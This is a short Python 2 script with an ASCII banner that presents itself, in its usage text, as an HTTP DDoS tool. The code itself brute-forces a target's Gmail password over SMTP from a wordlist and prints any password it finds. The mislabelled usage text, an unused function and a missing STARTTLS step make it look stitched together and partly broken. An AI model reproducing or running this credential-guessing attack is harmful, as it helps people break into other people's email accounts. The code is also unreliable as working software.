def usage():
	print '---------------------------------------------------'
	print 'USAGE: python httpdoser.py <url>'
	print 'httpdoser website : DDoS Attack'
	print "\a"
print \
"""
                                                
   (                          )                 
 ( )\           (    (     ( /(      )          
 )((_)   (     ))\   )(    )\())  ( /(    (     
((_)_    )\   /((_) (()\  ((_)\   )(_))   )\ )  
 | _ )  ((_) (_))(   ((_) | |(_) ((_)_   _(_/(  
 | _ \ / _ \ | || | | '_| | / /  / _` | | ' \)) 
 |___/ \___/  \_,_| |_|   |_\_\  \__,_| |_||_|  
                                                                                    
"""
print '---------------------------------------------------'

import smtplib

smtpasrver = smtplib.SMTP("smtp.gmail.com", 587)
smtpasrver.ehlo( )

user = raw_input("Enter the target's email : ")
passwfile = raw_input("Enter the password File : ")
passwfile = open(passwfile, "r")

for password in passwfile :
	try :
		    smtpasrver.login(user, password)
		    print ("[+] password found ==> ", password)
		    break;
	except smtplib.SMTPAuthenticationError:
		    print ("[!] password is incorrect ==> ", password)